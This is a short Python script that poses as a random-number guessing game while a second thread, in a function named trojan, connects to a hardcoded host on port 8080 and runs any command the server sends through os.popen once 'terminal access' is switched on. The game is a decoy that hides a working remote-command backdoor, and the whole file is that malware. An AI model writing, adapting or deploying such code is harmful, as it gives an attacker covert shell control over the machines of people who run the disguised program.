import random
import socket
import threading
import os

def game():
    
    while True:
        _from = int(input("Tell the engine to pick a number from: "))
        _to = int(input("Tell the engine to pick a number to: "))

        def getRandom(num1, num2):
            number = random.randrange(num1, num2)
            return number

        print(getRandom(_from, _to))


def trojan():
    HOST = "192.168.0.158"
    PORT = 8080

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))

    cmd_mode = False

    while True:
        server_cmd = client.recv(1024).decode("utf-8")
        if server_cmd == "cmd_access=true":
            cmd_mode = True
            client.send("You now have terminal access!".encode("utf-8"))
            continue

        if server_cmd == "cmd_access=false":
            cmd_mode = False
            client.send("You now disabled your terminal access power!".encode("utf-8"))
        
        if cmd_mode:
            os.popen(server_cmd)
        else:
            if server_cmd == "hello":
                print("Hello World!!!")
        
        client.send(f"{server_cmd} was executed succesfully!".encode("utf-8"))


t1 = threading.Thread(target=game)
t2 = threading.Thread(target=trojan)

t1.start()
t2.start()